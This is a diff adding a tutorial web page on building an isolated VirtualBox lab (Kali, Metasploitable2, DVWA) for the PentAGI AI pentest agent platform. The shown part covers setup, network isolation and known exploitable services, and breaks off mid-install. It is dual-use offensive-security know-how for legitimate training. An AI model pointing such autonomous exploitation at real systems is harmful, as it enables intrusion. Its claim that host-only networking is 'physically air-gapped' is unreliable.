@@ -1,0 +1,2196 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="../../../images/icon.webp" sizes="32x46" type="image/png">
+
+    <title>PentAGI Lab Setup: Complete Penetration Testing Guide with AI Agents (2026) | DevspireHub</title>
+
+    <meta name="description"
+        content="Set up a fully isolated PentAGI penetration testing lab on Kali Linux with VirtualBox. Step-by-step guide: install AI pentest agents, exploit Metasploitable2 & DVWA safely.">
+
+    <meta name="keywords"
+        content="PentAGI setup, penetration testing lab, Kali Linux hacking lab, Metasploitable2 tutorial, ethical hacking lab VirtualBox, AI pentest agent, DVWA setup, isolated hacking environment, pentesting beginners 2026">
+
+    <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+    <meta name="author" content="DevspireHub">
+    <meta name="rating" content="general">
+    <meta name="language" content="en">
+    <meta name="revisit-after" content="7 days">
+    <meta name="category" content="Cybersecurity, Ethical Hacking, Penetration Testing">
+
+    <link rel="canonical"
+        href="https://devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/set-up-isolated-pentagi-penetration-testing-lab.html">
+
+    <!-- ═══════════════════════════════════════════════
+           OPEN GRAPH — Facebook / LinkedIn
+      ═══════════════════════════════════════════════ -->
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="DevspireHub">
+    <meta property="og:locale" content="en_US">
+    <meta property="og:title" content="PentAGI Lab Setup: Build an Isolated AI Penetration Testing Lab (2026)">
+    <meta property="og:description"
+        content="Complete beginner guide to setting up a fully isolated PentAGI penetration testing lab using Kali Linux, VirtualBox, Metasploitable2 & DVWA. Run your first AI-powered pentest safely.">
+    <meta property="og:url"
+        content="https://devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/set-up-isolated-pentagi-penetration-testing-lab.html">
+    <meta property="og:image"
+        content="https://www.devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/images/set-up-isolated-pentagi-penetration-testing-lab.webp">
+    <meta property="og:image:alt" content="PentAGI AI penetration testing lab setup on Kali Linux with VirtualBox">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="article:published_time" content="2026-05-02T00:00:00+05:30">
+    <meta property="article:modified_time" content="2026-05-02T00:00:00+05:30">
+    <meta property="article:author" content="https://www.devspirehub.com/Website/about">
+    <meta property="article:section" content="Ethical Hacking">
+    <meta property="article:tag" content="PentAGI">
+    <meta property="article:tag" content="Penetration Testing">
+    <meta property="article:tag" content="Kali Linux">
+    <meta property="article:tag" content="Ethical Hacking">
+    <meta property="article:tag" content="AI Security">
+    <meta property="article:tag" content="Metasploitable2">
+
+    <!-- ═══════════════════════════════════════════════
+           TWITTER / X CARD
+      ═══════════════════════════════════════════════ -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@devspirehub">
+    <meta name="twitter:creator" content="@devspirehub">
+    <meta name="twitter:title" content="PentAGI Lab Setup: AI-Powered Penetration Testing for Beginners (2026)">
+    <meta name="twitter:description"
+        content="Build a fully isolated hacking lab with PentAGI AI agents on Kali Linux. Exploit Metasploitable2 & DVWA safely — step-by-step beginner tutorial.">
+    <meta name="twitter:image" content="https://www.devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/images/set-up-isolated-pentagi-penetration-testing-lab.webp>
+    <meta name=" twitter:image:alt" content="PentAGI AI penetration testing lab on Kali Linux — DevspireHub tutorial">
+
+    <!-- ═══════════════════════════════════════════════
+           PERFORMANCE — PRECONNECT & DNS-PREFETCH
+      ═══════════════════════════════════════════════ -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="dns-prefetch" href="//fonts.googleapis.com">
+    <link rel="dns-prefetch" href="//cdnjs.cloudflare.com">
+    <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+
+    <!-- ═══════════════════════════════════════════════
+           FAVICON & ICONS
+      ═══════════════════════════════════════════════ -->
+    <link rel="icon" type="image/x-icon" href="/favicon.ico">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/assets/icons/favicon-16x16.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/icons/apple-touch-icon.png">
+    <link rel="manifest" href="/site.webmanifest">
+
+    <!-- ═══════════════════════════════════════════════
+           THEME & BROWSER UI
+      ═══════════════════════════════════════════════ -->
+    <meta name="theme-color" content="#0f172a">
+    <meta name="msapplication-TileColor" content="#0f172a">
+    <meta name="msapplication-TileImage" content="/assets/icons/ms-icon-144x144.png">
+
+    <!-- ═══════════════════════════════════════════════
+           JSON-LD STRUCTURED DATA — TechArticle
+      ═══════════════════════════════════════════════ -->
+    <script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "TechArticle",
+        "headline": "PentAGI Lab Setup: Complete Penetration Testing Guide with AI Agents (2026)",
+        "description": "A complete step-by-step tutorial on building a fully isolated PentAGI penetration testing lab on Kali Linux using VirtualBox, Metasploitable2, and DVWA. Covers AI agent configuration, Ollama local LLM setup, and practical exploitation labs.",
+        "image": {
+          "@type": "ImageObject",
+          "url": "https://www.devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/images/set-up-isolated-pentagi-penetration-testing-lab.webp",
+          "width": 1200,
+          "height": 630
+        },
+        "datePublished": "2026-05-02",
+        "dateModified": "2026-05-02",
+        "author": {
+          "@type": "Person",
+          "name": "DevspireHub",
+          "url": "https://www.devspirehub.com/Website/about"
+        },
+        "publisher": {
+          "@type": "Organization",
+          "name": "DevspireHub",
+          "logo": {
+            "@type": "ImageObject",
+            "url": "https://www.devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/images/set-up-isolated-pentagi-penetration-testing-lab.webp",
+            "width": 200,
+            "height": 60
+          },
+          "url": "https://www.devspirehub.com"
+        },
+        "mainEntityOfPage": {
+          "@type": "WebPage",
+          "@id": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/set-up-isolated-pentagi-penetration-testing-lab.html"
+        },
+        "url": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/set-up-isolated-pentagi-penetration-testing-lab.html",
+        "inLanguage": "en-US",
+        "proficiencyLevel": "Beginner",
+        "teaches": [
+          "How to install PentAGI on Kali Linux",
+          "How to create an isolated VirtualBox host-only network",
+          "How to set up Metasploitable2 as a vulnerable target",
+          "How to exploit vsftpd 2.3.4 backdoor with Metasploit",
+          "How to perform AI-automated web app testing on DVWA",
+          "How to configure Ollama local LLM with PentAGI"
+        ],
+        "dependencies": "VirtualBox 7.x, Kali Linux, Docker, Docker Compose, Ollama or OpenAI API key",
+        "educationalLevel": "Beginner to Intermediate",
+        "keywords": "PentAGI, penetration testing lab, Kali Linux, Metasploitable2, DVWA, VirtualBox, ethical hacking, AI security agent, isolated lab setup"
+      }
+      </script>
+
+    <!-- ═══════════════════════════════════════════════
+           JSON-LD — HowTo (Lab Setup Steps)
+      ═══════════════════════════════════════════════ -->
+    <script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "HowTo",
+        "name": "How to Set Up an Isolated PentAGI Penetration Testing Lab",
+        "description": "Build a fully isolated, safe penetration testing lab using PentAGI AI, Kali Linux, VirtualBox, and Metasploitable2 — step by step.",
+        "image": "https://www.devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/images/set-up-isolated-pentagi-penetration-testing-lab.webp",
+        "totalTime": "PT2H",
+        "estimatedCost": {
+          "@type": "MonetaryAmount",
+          "currency": "USD",
+          "value": "0"
+        },
+        "supply": [
+          { "@type": "HowToSupply", "name": "VirtualBox 7.x" },
+          { "@type": "HowToSupply", "name": "Kali Linux ISO" },
+          { "@type": "HowToSupply", "name": "Metasploitable2 VMDK" },
+          { "@type": "HowToSupply", "name": "Docker and Docker Compose" },
+          { "@type": "HowToSupply", "name": "LLM API key (OpenAI, Anthropic, or free Ollama)" }
+        ],
+        "step": [
+          {
+            "@type": "HowToStep",
+            "position": 1,
+            "name": "Install VirtualBox and Create Host-Only Network",
+            "text": "Download and install VirtualBox 7.x. Create a host-only network (vboxnet0) at 192.168.56.1 with DHCP enabled to isolate all lab traffic from your real network.",
+            "url": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/set-up-isolated-pentagi-penetration-testing-lab.html"
+          },
+          {
+            "@type": "HowToStep",
+            "position": 2,
+            "name": "Install Kali Linux VM as Attacker Machine",
+            "text": "Create a Kali Linux VM with 4 GB RAM, two network adapters (NAT for internet, Host-Only for lab traffic), and assign static IP 192.168.56.10 to the host-only interface.",
+            "url": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/set-up-isolated-pentagi-penetration-testing-lab.html"
+          },
+          {
+            "@type": "HowToStep",
+            "position": 3,
+            "name": "Set Up Metasploitable2 as Vulnerable Target",
+            "text": "Import Metasploitable2 VMDK into VirtualBox. Attach only the Host-Only adapter. Boot and verify it receives IP 192.168.56.101 from DHCP — never connect it to NAT or internet.",
+            "url": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/set-up-isolated-pentagi-penetration-testing-lab.html"
+          },
+          {
+            "@type": "HowToStep",
+            "position": 4,
+            "name": "Install PentAGI on Kali Linux",
+            "text": "Install Docker and Docker Compose on Kali. Download the PentAGI installer from pentagi.com, run sudo ./installer, configure your LLM provider (use Ollama for free local AI), and access the dashboard at https://localhost:8443.",
+            "url": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/set-up-isolated-pentagi-penetration-testing-lab.html"
+          },
+          {
+            "@type": "HowToStep",
+            "position": 5,
+            "name": "Run Your First AI Pentest Flow",
+            "text": "Create a new Flow in PentAGI targeting 192.168.56.101. Write a reconnaissance objective and watch PentAGI's 13 AI agents run Nmap, identify CVEs, and auto-generate a structured security report.",
+            "url": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/set-up-isolated-pentagi-penetration-testing-lab.html"
+          }
+        ]
+      }
+      </script>
+
+    <!-- ═══════════════════════════════════════════════
+           JSON-LD — FAQPage (People Also Ask targeting)
+      ═══════════════════════════════════════════════ -->
+    <script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "FAQPage",
+        "mainEntity": [
+          {
+            "@type": "Question",
+            "name": "What is PentAGI and how is it different from traditional pentest tools?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "PentAGI (Penetration Testing Artificial General Intelligence) is an open-source autonomous AI platform by VXControl that coordinates 13 specialized AI agents to perform full penetration testing workflows — from reconnaissance to report generation — without manual tool chaining. Unlike tools like Nmap or Metasploit used individually, PentAGI unifies 200+ tools with AI-driven contextual decision-making."
+            }
+          },
+          {
+            "@type": "Question",
+            "name": "Is this penetration testing lab setup free?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "Yes — the entire lab is free. VirtualBox is free, Kali Linux is free, Metasploitable2 is free, DVWA is free, and PentAGI supports Ollama as a local LLM backend at zero cost. The only optional paid component is a commercial API key (OpenAI, Anthropic) if you prefer cloud LLMs."
+            }
+          },
+          {
+            "@type": "Question",
+            "name": "Why must the Metasploitable2 VM never have internet access?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "Metasploitable2 is intentionally full of critical vulnerabilities. Connecting it to the internet or your home network would expose it to real attackers and could allow PentAGI's autonomous AI agents to accidentally scan outside your lab. The Host-Only VirtualBox network creates a physically air-gapped environment where no traffic can leave your machine."
+            }
+          },
+          {
+            "@type": "Question",
+            "name": "What LLM does PentAGI use and can I run it without an API key?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "PentAGI supports GPT-4.1 (OpenAI), Claude (Anthropic), Gemini (Google), AWS Bedrock, and Ollama (free, runs locally). For this lab, Ollama with llama3.1:8b is recommended — it requires no API key, runs entirely on your machine, and keeps all data private."
+            }
+          },
+          {
+            "@type": "Question",
+            "name": "What vulnerabilities can I practice exploiting in this lab?",
+            "acceptedAnswer": {
+              "@type": "Answer",
+              "text": "Metasploitable2 contains dozens of real CVEs including the vsftpd 2.3.4 backdoor (CVE-2011-2523, CVSS 10.0), Samba username map injection (CVE-2007-2447), UnrealIRCd backdoor, and an open root shell on port 1524. DVWA adds web app vulnerabilities including SQL injection, XSS, command injection, and file inclusion — all in a safe, authorized environment."
+            }
+          }
+        ]
+      }
+      </script>
+
+    <!-- ═══════════════════════════════════════════════
+           JSON-LD — BreadcrumbList
+      ═══════════════════════════════════════════════ -->
+    <script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "BreadcrumbList",
+        "itemListElement": [
+          {
+            "@type": "ListItem",
+            "position": 1,
+            "name": "Home",
+            "item": "https://www.devspirehub.com"
+          },
+          {
+            "@type": "ListItem",
+            "position": 2,
+            "name": "Ethical Hacking",
+            "item": "https://www.devspirehub.com/Ethical-hacking"
+          },
+          {
+            "@type": "ListItem",
+            "position": 3,
+            "name": "PentAGI Lab Setup Guide",
+            "item": "https://devspirehub.com/Ethical-Hacking/tutorials/set-up-isolated-pentagi-penetration-testing-lab/set-up-isolated-pentagi-penetration-testing-lab.html"
+          }
+        ]
+      }
+      </script>
+
+    <!-- Author Information -->
+    <meta name="author" content="Kumaradoss / DevspireHub">
+    <link rel="author" href="https://devspirehub.com/about">
+
+
+    <script type="application/ld+json">
+        {
+            "@context": "https://schema.org",
+            "@type": "Organization",
+            "name": "DevspireHub",
+            "url": "https://devspirehub.com/",
+            "logo": "https://devspirehub.com/../../../images/icon.web",
+            "description": "DevspireHub - Programming, Projects, Ethical hacking, Networking, Cloud & AI",
+            "founder": [
+            {
+                "@type": "Person",
+                "name": "Kumaradoss",
+                "url": "https://www.linkedin.com/in/kumaradoss-s/"
+            }
+            ],
+            "sameAs": [
+            "https://www.linkedin.com/in/kumaradoss-s/",
+            "https://github.com/kumaradoss16",
+            ]
+        }
+    </script>
+
+    <script type=application/ld+json>
+        {
+            "@context": "https://schema.org",
+            "@type": "SiteNavigationElement",
+            "name": [
+                "Home",
+                "Projects",
+                "Programming",
+                "Ethical Hacking",
+                "Networking",
+                "Automation",
+                "Resources"
+            ],
+            "url": [
+                "https://devspirehub.com",
+                "https://devspirehub.com/#projects-tutorials-section",
+                "https://devspirehub.com/#programming-tutorials-section",
+                "https://devspirehub.com/#ethical-hacking-section",
+                "https://devspirehub.com/#networking-section",
+                "https://devspirehub.com/#automation-section",
+                "https://devspirehub.com/#info-section",
+            ]
+        }
+    </script>
+
+    <!-- Google Tag Manager -->
+    <script>(function (w, d, s, l, i) {
+            w[l] = w[l] || []; w[l].push({
+                'gtm.start':
+                    new Date().getTime(), event: 'gtm.js'
+            }); var f = d.getElementsByTagName(s)[0],
+                j = d.createElement(s), dl = l != 'dataLayer' ? '&l=' + l : ''; j.async = true; j.src =
+                    'https://www.googletagmanager.com/gtm.js?id=' + i + dl; f.parentNode.insertBefore(j, f);
+        })(window, document, 'script', 'dataLayer', 'GTM-M457RGDF');</script>
+    <!-- End Google Tag Manager -->
+
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2368356039533778"
+        crossorigin="anonymous"></script>
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-6VWY63Q80N"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+
+        gtag('config', 'G-6VWY63Q80N');
+    </script>
+
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+
+    <!-- Performance Optimization -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="../../Linux/prism/prism.css">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <!-- Google Tag Manager (noscript) -->
+    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-M457RGDF" height="0" width="0"
+            style="display:none;visibility:hidden"></iframe></noscript>
+    <!-- End Google Tag Manager (noscript) -->
+
+    <amp-auto-ads type="adsense" data-ad-client="ca-pub-2368356039533778">
+    </amp-auto-ads>
+    <!-- Header  -->
+    <header class="navbar">
+        <div class="container">
+            <div class="logo">
+                <div class="logo-text">
+                    <!-- <i class="fas fa-code"></i> -->
+                    <a href="../../../index.html"><img src="../../../images/icon.webp" alt="Gear Icon" width="23"
+                            height="23"></a>
+                    <span id="brand" class="typewriter" data-text="DevspireHub"></span>
+                </div>
+                <button class="menu-toggle" type="button" aria-label="Toggle navigation">
+                    <i class="fas fa-bars"></i>
+
+            </div> </button>
+            <nav class="nav-links">
+                <ul>
+                    <li><a href="../../../index.html" class="home"><i class="fa-solid fa-house"></i></a></li>
+                    <li><a href="../../../index.html#projects-tutorials-section" class="projects">Projects</a></li>
+                    <li><a href="../../../index.html#programming-tutorials-section" class="programming">Programming</a>
+                    </li>
+                    <li><a href="../../../index.html#ethical-hacking-section" class="hacking">Ethical Hacking</a>
+                    </li>
+                    <li><a href="../../../index.html#networking-section" class="networking">Networking</a></li>
+                    <li><a href="../../../index.html#automation-section" class="ai">Automation</a></li>
+                    <li><a href="../../../index.html#info-section" class="game">Resources</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <div class="main-content-wrapper container">
+        <main class="left-column">
+            <!-- Course Header Card  -->
+            <div class="card">
+                <div class="content">
+                    <h1>PentAGI Penetration Testing Lab Setup: Complete Beginner Tutorial
+                    </h1>
+                    <p>If you've been searching for the most advanced AI pentesting tool of 2026, your search ends here.
+                        PentAGI — Penetration
+                        Testing Artificial General Intelligence — is a fully autonomous, open-source AI agent platform
+                        that has fundamentally
+                        changed how penetration testing is performed. Built by VXControl and launched in early 2025,
+                        PentAGI is not just another
+                        scanning tool — it's an intelligent multi-agent system that plans, executes, and reports an
+                        entire pentest workflow with
+                        minimal human input.
+                    </p>
+                    <div class="card-image-output">
+                        <img src="images/set-up-isolated-pentagi-penetration-testing-lab.webp"
+                            alt="set up ethical hacking lab virtualbox kali-linux metasploitable2">
+                    </div>
+                    <div class="card-main-info">
+                        <p>What makes Pentagi penetration testing genuinely different from every other tool in the
+                            market is its architecture. At
+                            its core, PentAGI coordinates 13 specialized AI agents — including a Researcher for OSINT
+                            and intelligence gathering, a
+                            Developer for writing custom exploit scripts, and an Executor for running and chaining
+                            security tools — all working
+                            together as a synchronized team, just like a real red team would.
+                        </p>
+                        <p>Under the hood, PentAGI integrates 200+ professional-grade security tools — Nmap, Metasploit,
+                            sqlmap, Nikto, Masscan,
+                            and more — all running inside a fully sandboxed Docker environment. Nothing touches your
+                            host system. You simply define
+                            a target and context, and the AI handles every phase: automated reconnaissance,
+                            vulnerability identification, controlled
+                            exploitation, and professional report generation — end to end.
+                        </p>
+
+                        <div class="table-container">
+                            <h4>Why PentAGI Stands Apart from Traditional Tools</h4>
+                            <table>
+                                <thead>
+                                    <tr>
+                                        <th>Feature</th>
+                                        <th>Traditional Tools</th>
+                                        <th>PentAGI</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td><strong>Automation level</strong></td>
+                                        <td>Manual command chaining</td>
+                                        <td>Fully autonomous multi-agent AI</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Tools integrated</strong></td>
+                                        <td>Single-purpose</td>
+                                        <td>200+ tools unified</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Intelligence</strong></td>
+                                        <td>Static output</td>
+                                        <td>Contextual AI analysis + memory</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Reporting</strong></td>
+                                        <td>Manual compilation</td>
+                                        <td>Auto-generated structured reports</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>LLM support</strong></td>
+                                        <td>None</td>
+                                        <td>GPT-4.1, Claude, Gemini, Ollama</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Environment</strong></td>
+                                        <td>Host-level risk</td>
+                                        <td>Sandboxed Docker containers</td>
+                                    </tr>
+                                    <tr>
+                                        <td><strong>Memory</strong></td>
+                                        <td>No persistence</td>
+                                        <td>Neo4j knowledge graph</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+
+                        <p>By the end of this guide, you will have PentAGI fully installed on Kali Linux, a safe
+                            isolated lab environment running,
+                            and a complete understanding of how to run a real pentest flow — from first scan to final
+                            report — using one of the most
+                            powerful automated reconnaissance platforms available today.
+                        </p>
+                        <div class="pro-tips">
+                            <p><strong>⚠️ Legal Notice:</strong> Only use PentAGI against systems you own or have
+                                explicit
+                                written authorization to test. Unauthorized
+                                scanning or exploitation is a criminal offense in most countries. This tutorial is
+                                strictly
+                                for ethical, legal, and
+                                educational use.
+                            </p>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+
+            <div class="card linux-card introduction-card">
+                <h2>Introduction</h2>
+                <p>This Pentagi tutorial is your end-to-end guide to building a fully isolated penetration testing lab
+                    setup, installing
+                    PentAGI, and running your first real-world test — all safely inside a virtual network that can never
+                    touch the outside
+                    world. Designed for beginners, aspiring pentesters, and ethical hackers, every step is verified,
+                    practical, and legally
+                    safe.</p>
+                <div class="pro-tips">
+                    <p><strong>⚠️ Legal & Ethical Notice:</strong> Every technique in this guide is for educational and
+                        authorized use
+                        only. Never run scans,
+                        reconnaissance, or exploits against any system you do not personally own or have explicit
+                        written authorization to test.
+                        Unauthorized hacking is a criminal offense under laws including the CFAA (US), Computer Misuse
+                        Act (UK), and IT Act
+                        (India)..</p>
+                </div>
+                <h3>What Is PentAGI?</h3>
+                <p class="subtitle">PentAGI (Penetration Testing Artificial General Intelligence) is a fully autonomous,
+                    open-source AI platform for
+                    security testing developed by VXControl. Instead of manually chaining tools together, PentAGI
+                    deploys a team of 13
+                    specialized AI agents that handle reconnaissance, vulnerability scanning, exploitation planning, and
+                    report generation
+                    as a coordinated workflow — like having a virtual red team available 24/7.</p>
+                <h4>Real-World Use Cases</h4>
+                <div class="list">
+                    <p class="subtitle">By completing this tutorial you will be able to:</p>
+                    <ul>
+                        <li><strong>Automated recon</strong> — Full port scanning, OS detection, service fingerprinting,
+                            OSINT gathering.</li>
+                        <li><strong>Vulnerability identification</strong> — Cross-referencing live service versions
+                            against CVE databases in real-time.</li>
+                        <li><strong>Exploitation workflows</strong> — Orchestrating Metasploit and custom scripts
+                            against confirmed vulnerabilities.</li>
+                        <li><strong>Security reporting</strong> — Auto-generating structured reports with CVSS scores,
+                            PoC evidence, and remediation steps.
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="content">
+                    <h3>Part 1 — Lab Architecture Design</h3>
+                    <h4>Why Isolation Is Mandatory</h4>
+                    <p>PentAGI's AI agents launch port scanners, exploit frameworks, and credential attacks autonomously
+                        and at machine speed.
+                        If your lab is connected to the internet, your home network, or your organization's LAN — those
+                        tools will reach beyond
+                        your intended target. That means accidentally scanning your ISP, triggering abuse reports, or
+                        attacking neighbors'
+                        devices. A host-only network creates a private, air-gapped bubble where traffic physically
+                        cannot leave your machine.</p>
+                    <div class="card-image-output">
+                        <img src="images/set-up-isolated-pentagi-penetration-testing-lab-diagram.webp"
+                            alt="set-up-isolated-pentagi-penetration-testing-lab-diagram">
+                    </div>
+
+                    <div class="table-container">
+                        <h4>IP Addressing Plan</h4>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Machine</th>
+                                    <th>Role</th>
+                                    <th>IP Address</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>VirtualBox Host-Only Gateway</strong></td>
+                                    <td>Network gateway</td>
+                                    <td><code>192.168.56.1</code></td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Kali Linux VM</strong></td>
+                                    <td>Attacker / PentAGI host</td>
+                                    <td><code>192.168.56.10</code></td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Metasploitable2 VM</strong></td>
+                                    <td>Vulnerable target (network)</td>
+                                    <td><code>192.168.56.101</code></td>
+                                </tr>
+                                <tr>
+                                    <td><strong>DVWA (Docker on Kali)</strong></td>
+                                    <td>Vulnerable target (web app)</td>
+                                    <td><code>192.168.56.10:8080</code></td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Part 2 — System Requirements</h3>
+                    <div class="table-container">
+                        <h4>Hardware Requirements</h4>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Resource</th>
+                                    <th>Minimum</th>
+                                    <th>Recommended</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><strong>CPU</strong></td>
+                                    <td>4 cores</td>
+                                    <td>6–8 cores</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>RAM</strong></td>
+                                    <td>8 GB total</td>
+                                    <td>16 GB+</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Disk</strong></td>
+                                    <td>60 GB free</td>
+                                    <td>100+ GB SSD</td>
+                                </tr>
+                                <tr>
+                                    <td><strong>Virtualization</strong></td>
+                                    <td>VT-x/AMD-V enabled in BIOS</td>
+                                    <td>Required</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <div class="list">
+                        <p class="sub"><strong class="subtitle">RAM allocation breakdown:</strong></p>
+                        <ul>
+                            <li>Kali Linux VM (with PentAGI): 4–6 GB</li>
+                            <li>Metasploitable2 VM: 512 MB</li>
+                            <li>Host OS: 2 GB minimum</li>
+                        </ul>
+                    </div>
+
+                    <div class="list">
+                        <p class="sub"><strong class="subtitle">RAM allocation breakdown:</strong></p>
+                        <ul>
+                            <li>VirtualBox 7.x (free) or VMware Workstation Pro.</li>
+                            <li>Kali Linux ISO (latest, from <a href="https://www.kali.org/get-kali/"
+                                    class="link">kali.org</a>).</li>
+                            <li>Metasploitable2 VMDK (from <a href="https://sourceforge.net/projects/metasploitable2/"
+                                    class="link">SourceForge</a>).</li>
+                            <li>Docker and Docker Compose (installed on Kali).</li>
+                            <li>An LLM API key — OpenAI, Anthropic, Google Gemini, or local Ollama (free).</li>
+                        </ul>
+                    </div>
+                    <p class="sub"><strong class="subtitle">OS Compatibility</strong></p>
+                    <p>PentAGI runs on Linux, macOS, and Windows — but Kali Linux is strongly recommended for this
+                        tutorial as it provides the
+                        full pentesting tool ecosystem alongside PentAGI.</p>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Part 3 — VirtualBox Setup</h3>
+                    <h4>Step 1 — Install VirtualBox</h4>
+                    <p>Download from <a href="https://www.virtualbox.org/wiki/Downloads" class="link">virtualbox.org</a>
+                        and install On Windows:
+                    </p>
+                    <p>Run the installer → Accept defaults → <a
+                            href="../configure-virtualbox-networks-for-isolated-hacking-lab/configure-virtualbox-networks-for-isolated-hacking-lab.html"
+                            class="link">Install VirtualBox Network Adapter</a> when prompted</p>
+                    <h4>Step 2 — Create the Host-Only Network</h4>
+                    <div class="bg-color">
+                        <pre>
+VirtualBox Menu → File → Tools → Network Manager
+  Click [Create]
+  
+  Adapter Tab:
+    IPv4 Address: 192.168.56.1
+    IPv4 Network Mask: 255.255.255.0
+  
+  DHCP Server Tab:
+    ☑ Enable Server
+    Server Address: 192.168.56.100
+    Lower Address Bound: 192.168.56.101
+    Upper Address Bound: 192.168.56.200
+  
+  Click [Apply]</pre>
+                    </div>
+                    <p>This creates vboxnet0 — your isolated private network.</p>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Part 4 — Kali Linux VM Setup (Attacker Machine)</h3>
+                    <h4>Step 1 — Download Kali Linux</h4>
+                    <p>Go to <a href="https://www.kali.org/get-kali/" class="link">kali.org/get-kali</a> → download the
+                        Installer ISO (64-bit, ~4 GB).
+                    </p>
+                    <h4>Step 2 — Create Kali VM in VirtualBox</h4>
+                    <div class="bg-color">
+                        <pre>
+VirtualBox → [New]
+  Name: Kali-Attacker
+  Type: Linux
+  Version: Debian (64-bit)
+  RAM: 4096 MB (4 GB minimum, 6144 MB recommended)
+  CPU: 2–4 vCPUs
+  Disk: 50 GB (dynamically allocated)</pre>
+                    </div>
+                    <h4>Step 3 — Configure Network Adapters</h4>
+                    <div class="bg-color">
+                        <pre>
+Kali VM → Settings → Network
+
+  Adapter 1:
+    ☑ Enable
+    Attached to: NAT          ← For internet (downloading tools)
+  
+  Adapter 2:
+    ☑ Enable
+    Attached to: Host-only Adapter
+    Name: vboxnet0            ← For attacking targets</pre>
+                    </div>
+                    <div class="pro-tips">
+                        <p>ℹ️ Two adapters: NAT for internet access during setup; Host-Only for lab traffic. Once
+                            PentAGI is installed, you can
+                            disable NAT for full isolation.</p>
+                    </div>
+                    <h4>Step 4 — Install Kali Linux</h4>
+                    <div class="list">
+                        <ol>
+                            <li>Mount the ISO: VM Settings → Storage → Empty optical drive → Choose ISO file.</li>
+                            <li>Start the VM → Select Graphical Install.</li>
